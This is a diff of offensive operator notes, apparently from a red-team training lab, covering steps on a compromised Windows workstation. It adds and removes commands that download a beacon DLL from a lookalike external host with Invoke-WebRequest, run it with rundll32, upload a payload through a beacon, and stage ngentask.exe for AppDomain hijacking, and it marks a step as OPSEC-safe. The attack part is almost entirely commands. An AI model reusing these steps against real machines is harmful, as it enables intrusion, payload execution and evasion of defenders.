@@ -620,9 +620,9 @@ icacls C:\Windows\Temp
 
 ## Download Beacon DLL to Workstation
 
-On `lon-wkstn-1` as `pchilds` — `Invoke-WebRequest` works in ConstrainedLanguage:
+>On `lon-wkstn-1` as `pchilds` — `Invoke-WebRequest` works in ConstrainedLanguage:  
 
-```powershell
+```beacon
 cd C:\Windows\Tasks\
 Invoke-WebRequest -Uri 'http://www.bleepincomputer.com/beacon.dll' -OutFile 'C:\Windows\Tasks\beacon.dll'
 ```
@@ -644,22 +644,23 @@ rundll32.exe C:\Windows\Tasks\beacon.dll,StartW
 >No phishing needed  
 
 
-### Host AppDomainHijack.dll Payload  
+### Upload AppDomainHijack.dll  
+
+>beacon>   
 
 ```
-Site Management > Host File
-  File:   C:\Payloads\AppDomainHijack.dll
-  URI:    /AppDomainHijack.dll
-  Port:   80
+upload C:\Payloads\AppDomainHijack.dll
 ```
 
-### Download AppDomainHijack.dll & ngentask Execute  
+### Use AppDomainHijack.dll & ngentask Execute  
+
+>On Compromised workstation:  
 
 ```powershell
 # On foothold workstation — set APPDOMAIN env vars and run ngentask (OPSEC-🟢SAFE)
 
 cd C:\Windows\Tasks\
-Invoke-WebRequest -Uri 'http://www.bleepincomputer.com/AppDomainHijack.dll' -OutFile 'C:\Windows\Tasks\AppDomainHijack.dll'
+ls
 
 cp C:\Windows\WinSxS\amd64_netfx4-ngentask_exe_b03f5f7f11d50a3a_4.0.15805.0_none_d4039dd5692796db\ngentask.exe C:\Windows\Tasks\
 
